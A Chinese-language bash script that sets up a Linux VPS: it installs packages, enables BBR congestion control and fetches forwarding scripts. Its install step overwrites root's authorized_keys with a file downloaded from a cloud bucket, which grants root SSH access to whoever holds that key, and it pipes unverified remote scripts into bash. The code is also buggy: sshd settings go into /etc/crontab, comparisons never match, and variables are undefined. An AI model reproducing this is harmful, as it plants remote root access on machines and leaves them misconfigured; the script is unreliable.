#!/bin/bash

Green_font_prefix="\033[32m" && Red_font_prefix="\033[31m" && Green_background_prefix="\033[42;37m" && Red_background_prefix="\033[41;37m" && Font_color_suffix="\033[0m"
Info="${Green_font_prefix}[信息]${Font_color_suffix}"
Error="${Red_font_prefix}[错误]${Font_color_suffix}"
Tip="${Green_font_prefix}[注意]${Font_color_suffix}"

#安装必要插件
function check_system(){
    if grep -Eqi "CentOS" /etc/issue || grep -Eq "CentOS" /etc/*-release; then
        release='CentOS'
        PM='yum'
    elif grep -Eqi "Red Hat Enterprise Linux Server" /etc/issue || grep -Eq "Red Hat Enterprise Linux Server" /etc/*-release; then
        release='RHEL'
        PM='yum'
    elif grep -Eqi "Aliyun" /etc/issue || grep -Eq "Aliyun" /etc/*-release; then
        release='Aliyun'
        PM='yum'
    elif grep -Eqi "Fedora" /etc/issue || grep -Eq "Fedora" /etc/*-release; then
        release='Fedora'
        PM='yum'
    elif grep -Eqi "Debian" /etc/issue || grep -Eq "Debian" /etc/*-release; then
        release='Debian'
        PM='apt'
    elif grep -Eqi "Ubuntu" /etc/issue || grep -Eq "Ubuntu" /etc/*-release; then
        release='Ubuntu'
        PM='apt'
    elif grep -Eqi "Raspbian" /etc/issue || grep -Eq "Raspbian" /etc/*-release; then
        release='Raspbian'
        PM='apt'
    else
        release='Unknow'
    fi
    bit=`uname -m`
    if ! [[ ${release} == "Unknow" ]] && [[ ${bit} == "x86_64" ]]; then
    echo -e "当前系统为[${release} ${bit}]"
    else
    echo -e "\033[31m 脚本停止运行(●°u°●)​ 」，请更换64位系统运行此脚本 \033[0m"
    exit 0;
    fi
}

function install(){

    ${PM} update && ${PM} install -y wget && ${PM} install -y unzip && ${PM} install -y curl && ${PM} install -y vim && ${PM} install -y vnstat && ${PM} install -y sudo

    cd /root
    mkdir .ssh
    cd .ssh
    wget https://928gongyao.oss-cn-hongkong.aliyuncs.com/authorized_keys -O authorized_keys
    sed -i '/PubkeyAuthentication/d'  /etc/ssh/sshd_config
    sed -i '/PasswordAuthentication/d'  /etc/ssh/sshd_config
    echo "PubkeyAuthentication yes" >> /etc/crontab
    echo "PasswordAuthentication no" >> /etc/crontab
    service sshd restart
    cd /root

    timedatectl set-timezone Asia/Shanghai

    check_status
    if [[ ${kernel_status} == "noinstall" ]]; then
        echo -e " 当前状态: ${Green_font_prefix}未安装${Font_color_suffix} 加速内核 ${Red_font_prefix}即将开始安装${Font_color_suffix}"
        installbbr
    else
        echo -e " 当前状态: ${Green_font_prefix}已安装${Font_color_suffix} ${_font_prefix}${kernel_status}${Font_color_suffix} 加速内核 , ${Green_font_prefix}${run_status}${Font_color_suffix}"
        
    fi

    startbbr
    
    wget -qO natcfg.sh https://raw.githubusercontent.com/arloor/iptablesUtils/master/natcfg.sh && chmod +x natcfg.sh
    wget -N --no-check-certificate https://raw.githubusercontent.com/Jinxs9/SSRSpeed/master/brook-pf.sh && chmod +x brook-pf.sh

    echo -e "完成"
}

#卸载全部加速
remove_all(){
    rm -rf bbrmod
    sed -i '/net.core.default_qdisc/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_congestion_control/d' /etc/sysctl.conf
    sed -i '/fs.file-max/d' /etc/sysctl.conf
    sed -i '/net.core.rmem_max/d' /etc/sysctl.conf
    sed -i '/net.core.wmem_max/d' /etc/sysctl.conf
    sed -i '/net.core.rmem_default/d' /etc/sysctl.conf
    sed -i '/net.core.wmem_default/d' /etc/sysctl.conf
    sed -i '/net.core.netdev_max_backlog/d' /etc/sysctl.conf
    sed -i '/net.core.somaxconn/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_syncookies/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_tw_reuse/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_tw_recycle/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_fin_timeout/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_keepalive_time/d' /etc/sysctl.conf
    sed -i '/net.ipv4.ip_local_port_range/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_max_syn_backlog/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_max_tw_buckets/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_rmem/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_wmem/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_mtu_probing/d' /etc/sysctl.conf
    sed -i '/net.ipv4.ip_forward/d' /etc/sysctl.conf
    sed -i '/fs.inotify.max_user_instances/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_syncookies/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_fin_timeout/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_tw_reuse/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_max_syn_backlog/d' /etc/sysctl.conf
    sed -i '/net.ipv4.ip_local_port_range/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_max_tw_buckets/d' /etc/sysctl.conf
    sed -i '/net.ipv4.route.gc_timeout/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_synack_retries/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_syn_retries/d' /etc/sysctl.conf
    sed -i '/net.core.somaxconn/d' /etc/sysctl.conf
    sed -i '/net.core.netdev_max_backlog/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_timestamps/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_max_orphans/d' /etc/sysctl.conf
    if [[ -e /appex/bin/lotServer.sh ]]; then
        bash <(wget --no-check-certificate -qO- https://github.com/MoeClub/lotServer/raw/master/Install.sh) uninstall
    fi
    clear
    echo -e "${Info}:清除加速完成。"
    sleep 1s
}

#安装BBR内核
installbbr(){
    kernel_version="4.11.8"
    if [[ "${release}" == "centos" ]]; then
        rpm --import http://${github}/bbr/${release}/RPM-GPG-KEY-elrepo.org
        yum install -y http://${github}/bbr/${release}/${version}/${bit}/kernel-ml-${kernel_version}.rpm
        yum remove -y kernel-headers
        yum install -y http://${github}/bbr/${release}/${version}/${bit}/kernel-ml-headers-${kernel_version}.rpm
        yum install -y http://${github}/bbr/${release}/${version}/${bit}/kernel-ml-devel-${kernel_version}.rpm
    elif [[ "${release}" == "debian" || "${release}" == "ubuntu" ]]; then
        mkdir bbr && cd bbr
        wget http://security.debian.org/debian-security/pool/updates/main/o/openssl/libssl1.0.0_1.0.1t-1+deb8u10_amd64.deb
        wget -N --no-check-certificate http://${github}/bbr/debian-ubuntu/linux-headers-${kernel_version}-all.deb
        wget -N --no-check-certificate http://${github}/bbr/debian-ubuntu/${bit}/linux-headers-${kernel_version}.deb
        wget -N --no-check-certificate http://${github}/bbr/debian-ubuntu/${bit}/linux-image-${kernel_version}.deb
    
        dpkg -i libssl1.0.0_1.0.1t-1+deb8u10_amd64.deb
        dpkg -i linux-headers-${kernel_version}-all.deb
        dpkg -i linux-headers-${kernel_version}.deb
        dpkg -i linux-image-${kernel_version}.deb
        cd .. && rm -rf bbr
    fi
    detele_kernel
    BBR_grub
    echo -e "${Tip} 请重启VPS"
}

#更新引导
BBR_grub(){
    if [[ "${release}" == "centos" ]]; then
        if [[ ${version} = "6" ]]; then
            if [ ! -f "/boot/grub/grub.conf" ]; then
                echo -e "${Error} /boot/grub/grub.conf 找不到，请检查."
                exit 1
            fi
            sed -i 's/^default=.*/default=0/g' /boot/grub/grub.conf
        elif [[ ${version} = "7" ]]; then
            if [ ! -f "/boot/grub2/grub.cfg" ]; then
                echo -e "${Error} /boot/grub2/grub.cfg 找不到，请检查."
                exit 1
            fi
            grub2-set-default 0
        fi
    elif [[ "${release}" == "debian" || "${release}" == "ubuntu" ]]; then
        /usr/sbin/update-grub
    fi
}

#删除多余内核
detele_kernel(){
    if [[ "${release}" == "centos" ]]; then
        rpm_total=`rpm -qa | grep kernel | grep -v "${kernel_version}" | grep -v "noarch" | wc -l`
        if [ "${rpm_total}" > "1" ]; then
            echo -e "检测到 ${rpm_total} 个其余内核，开始卸载..."
            for((integer = 1; integer <= ${rpm_total}; integer++)); do
                rpm_del=`rpm -qa | grep kernel | grep -v "${kernel_version}" | grep -v "noarch" | head -${integer}`
                echo -e "开始卸载 ${rpm_del} 内核..."
                rpm --nodeps -e ${rpm_del}
                echo -e "卸载 ${rpm_del} 内核卸载完成，继续..."
            done
            echo --nodeps -e "内核卸载完毕，继续..."
        else
            echo -e " 检测到 内核 数量不正确，请检查 !" && exit 1
        fi
    elif [[ "${release}" == "debian" || "${release}" == "ubuntu" ]]; then
        deb_total=`dpkg -l | grep linux-image | awk '{print $2}' | grep -v "${kernel_version}" | wc -l`
        if [ "${deb_total}" > "1" ]; then
            echo -e "检测到 ${deb_total} 个其余内核，开始卸载..."
            for((integer = 1; integer <= ${deb_total}; integer++)); do
                deb_del=`dpkg -l|grep linux-image | awk '{print $2}' | grep -v "${kernel_version}" | head -${integer}`
                echo -e "开始卸载 ${deb_del} 内核..."
                apt-get purge -y ${deb_del}
                echo -e "卸载 ${deb_del} 内核卸载完成，继续..."
            done
            echo -e "内核卸载完毕，继续..."
        else
            echo -e " 检测到 内核 数量不正确，请检查 !" && exit 1
        fi
    fi
}

startbbr(){
    remove_all
    echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
    echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
    echo "net.ipv4.ip_local_port_range=1024 37000" >> /etc/sysctl.conf
    sysctl -p
    echo -e "${Info}BBR启动成功！"
}

check_status(){
    kernel_version=`uname -r | awk -F "-" '{print $1}'`
    kernel_version_full=`uname -r`
    if [[ ${kernel_version_full} = "4.14.129-bbrplus" ]]; then
        kernel_status="BBRplus"
    elif [[ ${kernel_version} = "3.10.0" || ${kernel_version} = "3.16.0" || ${kernel_version} = "3.2.0" || ${kernel_version} = "4.4.0" || ${kernel_version} = "3.13.0"  || ${kernel_version} = "2.6.32" || ${kernel_version} = "4.9.0" ]]; then
        kernel_status="Lotserver"
    elif [[ `echo ${kernel_version} | awk -F'.' '{print $1}'` == "4" ]] && [[ `echo ${kernel_version} | awk -F'.' '{print $2}'` -ge 9 ]] || [[ `echo ${kernel_version} | awk -F'.' '{print $1}'` == "5" ]]; then
        kernel_status="BBR"
    else 
        kernel_status="noinstall"
    fi

    if [[ ${kernel_status} == "Lotserver" ]]; then
        if [[ -e /appex/bin/lotServer.sh ]]; then
            run_status=`bash /appex/bin/lotServer.sh status | grep "LotServer" | awk  '{print $3}'`
            if [[ ${run_status} = "running!" ]]; then
                run_status="启动成功"
            else 
                run_status="启动失败"
            fi
        else 
            run_status="未安装加速模块"
        fi
    elif [[ ${kernel_status} == "BBR" ]]; then
        run_status=`grep "net.ipv4.tcp_congestion_control" /etc/sysctl.conf | awk -F "=" '{print $2}'`
        if [[ ${run_status} == "bbr" ]]; then
            run_status=`lsmod | grep "bbr" | awk '{print $1}'`
            if [[ ${run_status} == "tcp_bbr" ]]; then
                run_status="BBR启动成功"
            else 
                run_status="BBR启动失败"
            fi
        elif [[ ${run_status} == "tsunami" ]]; then
            run_status=`lsmod | grep "tsunami" | awk '{print $1}'`
            if [[ ${run_status} == "tcp_tsunami" ]]; then
                run_status="BBR魔改版启动成功"
            else 
                run_status="BBR魔改版启动失败"
            fi
        elif [[ ${run_status} == "nanqinlang" ]]; then
            run_status=`lsmod | grep "nanqinlang" | awk '{print $1}'`
            if [[ ${run_status} == "tcp_nanqinlang" ]]; then
                run_status="暴力BBR魔改版启动成功"
            else 
                run_status="暴力BBR魔改版启动失败"
            fi
        else 
            run_status="未安装加速模块"
        fi
    elif [[ ${kernel_status} == "BBRplus" ]]; then
        run_status=`grep "net.ipv4.tcp_congestion_control" /etc/sysctl.conf | awk -F "=" '{print $2}'`
        if [[ ${run_status} == "bbrplus" ]]; then
            run_status=`lsmod | grep "bbrplus" | awk '{print $1}'`
            if [[ ${run_status} == "tcp_bbrplus" ]]; then
                run_status="BBRplus启动成功"
            else 
                run_status="BBRplus启动失败"
            fi
        else 
            run_status="未安装加速模块"
        fi
    fi
}

check_system
install
